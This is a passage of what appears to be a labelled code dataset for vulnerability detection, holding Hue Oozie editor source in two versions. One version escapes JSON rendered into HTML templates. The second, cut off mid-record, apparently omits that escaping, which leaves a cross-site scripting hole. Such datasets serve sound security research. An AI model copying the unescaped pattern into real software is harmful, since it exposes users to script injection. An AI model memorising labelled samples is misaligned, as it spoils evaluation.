'America/Los_Angeles',\n              'start': datetime.today(),\n              'end': datetime.today() + timedelta(days=3),\n              'workflow': None,\n              'timeout': None,\n              'concurrency': None,\n              'execution': None,\n              'throttle': None,\n              'job_xml': '',\n              'sla_enabled': False,\n              'sla_workflow_enabled': False,\n              'credentials': [],\n              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}],\n              'properties': [], # Aka workflow parameters\n              'sla': Workflow.SLA_DEFAULT\n          }\n      }\n\n  @property\n  def id(self):\n    return self.document.id\n\n  @property\n  def uuid(self):\n    return self.document.uuid\n\n  def json_for_html(self):\n    _data = self.data.copy()\n\n    _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n    _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n\n    return json.dumps(_data, cls=JSONEncoderForHTML)\n \n  @property\n  def data(self):\n    if type(self._data['properties']['start']) == unicode:\n      self._data['properties']['start'] = parse(self._data['properties']['start'])\n      \n    if type(self._data['properties']['end']) == unicode:\n      self._data['properties']['end'] = parse(self._data['properties']['end'])    \n\n    if self.document is not None:\n      self._data['id'] = self.document.id\n\n    return self._data\n  \n  @property\n  def name(self):\n    return self.data['name']\n\n  @property      \n  def deployment_dir(self):\n    if not self.data['properties'].get('deployment_dir'):\n      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    \n    return self.data['properties']['deployment_dir']\n  \n  def find_parameters(self):\n    params = set()\n\n    if self.sla_enabled:\n      for param in find_json_parameters(self.sla):\n        params.add(param)\n\n# get missed params from wf\n\n#    for prop in self.workflow.get_parameters():\n#      if not prop['name'] in index:\n#        props.append(prop)\n#        index.append(prop['name'])\n#\n#    # Remove DataInputs and DataOutputs\n#    datainput_names = [_input.name for _input in self.datainput_set.all()]\n#    dataoutput_names = [_output.name for _output in self.dataoutput_set.all()]\n#    removable_names = datainput_names + dataoutput_names\n#    props = filter(lambda prop: prop['name'] not in removable_names, props)\n\n# get $params in wf properties\n# [{'name': parameter['workflow_variable'], 'value': parameter['dataset_variable']} for parameter in self.data['variables'] if parameter['dataset_type'] == 'parameter']\n\n    return dict([(param, '') for param in list(params)])\n  \n  @property      \n  def sla_enabled(self):\n    return self.data['properties']['sla_enabled']\n\n  @property      \n  def sla(self):\n    return self.data['properties']['sla']\n  \n  @property      \n  def parameters(self):\n    return self.data['properties']['parameters']\n  \n  @property\n  def datasets(self):\n    return self.inputDatasets + self.outputDatasets\n  \n  @property\n  def inputDatasets(self):    \n    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'input_path']\n    \n  @property\n  def outputDatasets(self):\n    return [Dataset(dataset) for dataset in self.data['variables'] if dataset['dataset_type'] == 'output_path']\n\n  @property\n  def start_utc(self):\n    return utc_datetime_format(self.data['properties']['start'])\n\n  @property\n  def end_utc(self):\n    return utc_datetime_format(self.data['properties']['end'])\n\n  @property\n  def frequency(self):\n    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['properties']['frequency_unit'], 'number': self.data['properties']['frequency_number']}\n\n  @property\n  def cron_frequency(self):\n    data_dict = self.data['properties']\n    \n    if 'cron_frequency' in data_dict:\n      return data_dict['cron_frequency']\n    else:\n      # Backward compatibility\n      freq = '0 0 * * *'\n      if data_dict['frequency_number'] == 1:\n        if data_dict['frequency_number'] == 'MINUTES':\n          freq = '* * * * *'\n        elif data_dict['frequency_number'] == 'HOURS':\n          freq = '0 * * * *'\n        elif data_dict['frequency_number'] == 'DAYS':\n          freq = '0 0 * * *'\n        elif data_dict['frequency_number'] == 'MONTH':\n          freq = '0 0 * * *'\n      return {'frequency': freq, 'isAdvancedCron': False}\n\n  def to_xml(self, mapping=None):\n    if mapping is None:\n      mapping = {}\n\n    tmpl = \"editor/gen2/coordinator.xml.mako\"\n    return re.sub(re.compile('\\s*\\n+', re.MULTILINE), '\\n', django_mako.render_to_string(tmpl, {'coord': self, 'mapping': mapping})).encode('utf-8', 'xmlcharrefreplace') \n  \n  @property\n  def properties(self):    \n    props = [{'name': dataset['workflow_variable'], 'value': dataset['dataset_variable']} for dataset in self.data['variables'] if dataset['dataset_type'] == 'parameter']\n    props += self.data['properties']['properties']\n    return props\n\n\nclass Dataset():\n\n  def __init__(self, data):\n    self._data = data\n\n  @property\n  def data(self):\n    if type(self._data['start']) == unicode: \n      self._data['start'] = parse(self._data['start'])\n\n    self._data['name'] = self._data['workflow_variable']\n\n    return self._data      \n      \n  @property\n  def frequency(self):\n    return '${coord:%(unit)s(%(number)d)}' % {'unit': self.data['frequency_unit'], 'number': self.data['frequency_number']}\n      \n  @property\n  def start_utc(self):\n    return utc_datetime_format(self.data['start'])\n\n  @property\n  def start_instance(self):\n    if not self.is_advanced_start_instance:\n      return int(self.data['advanced_start_instance'])\n    else:\n      return 0\n\n  @property\n  def is_advanced_start_instance(self):\n    return not self.is_int(self.data['advanced_start_instance'])\n\n  def is_int(self, text):\n    try:\n      int(text)\n      return True\n    except ValueError:\n      return False\n\n  @property\n  def end_instance(self):\n    if not self.is_advanced_end_instance:\n      return int(self.data['advanced_end_instance'])\n    else:\n      return 0\n\n  @property\n  def is_advanced_end_instance(self):\n    return not self.is_int(self.data['advanced_end_instance'])\n\n\n\nclass Bundle(Job):\n  XML_FILE_NAME = 'bundle.xml'\n  PROPERTY_APP_PATH = 'oozie.bundle.application.path'\n  HUE_ID = 'hue-id-b'\n\n  def __init__(self, data=None, json_data=None, document=None):\n    self.document = document\n\n    if document is not None:\n      self._data = json.loads(document.data)\n    elif json_data is not None:\n      self._data = json.loads(json_data)\n    elif data is not None:\n      self._data = data\n    else:\n      self._data = {\n          'id': None, \n          'uuid': None,\n          'name': 'My Bundle',\n          'coordinators': [],\n          'properties': {\n              'deployment_dir': '',\n              'schema_version': 'uri:oozie:bundle:0.2',\n              'kickoff': datetime.today(),\n              'parameters': [{'name': 'oozie.use.system.libpath', 'value': True}]\n          }\n      }\n\n  @property\n  def id(self):\n    return self.document.id\n\n  @property\n  def uuid(self):\n    return self.document.uuid\n\n  def json_for_html(self):\n    _data = self.data.copy()\n\n    _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n\n    return json.dumps(_data, cls=JSONEncoderForHTML)\n \n  @property\n  def data(self):\n    if type(self._data['properties']['kickoff']) == unicode:\n      self._data['properties']['kickoff'] = parse(self._data['properties']['kickoff'])\n\n    if self.document is not None:\n      self._data['id'] = self.document.id\n\n    return self._data\n \n  def to_xml(self, mapping=None):\n    if mapping is None:\n      mapping = {}\n\n    mapping.update(dict(list(Document2.objects.filter(type='oozie-coordinator2', uuid__in=self.data['coordinators']).values('uuid', 'name'))))\n    tmpl = \"editor/gen2/bundle.xml.mako\"\n    return force_unicode(\n              re.sub(re.compile('\\s*\\n+', re.MULTILINE), '\\n', django_mako.render_to_string(tmpl, {\n                'bundle': self,\n                'mapping': mapping\n           })))\n  \n  \n  @property      \n  def name(self):\n    return self.data['name']\n  \n  @property      \n  def parameters(self):\n    return self.data['properties']['parameters']  \n  \n  @property\n  def kick_off_time_utc(self):\n    return utc_datetime_format(self.data['properties']['kickoff'])  \n  \n  @property      \n  def deployment_dir(self):\n    if not self.data['properties'].get('deployment_dir'):\n      self.data['properties']['deployment_dir'] = Job.get_workspace(user)    \n    return self.data['properties']['deployment_dir']\n  \n  def find_parameters(self):\n    return {}\n/n/n/napps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.lib.json_utils import JSONEncoderForHTML\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json_for_html(),\n      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json_for_html(),\n      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n/n/n/n", "label": 0}, {"id": "6641c62beaa1468082e47d82da5ed758d11c7735", "code": "/apps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout']),\n      'workflow_json': json.dumps(workflow_data['workflow']),\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow 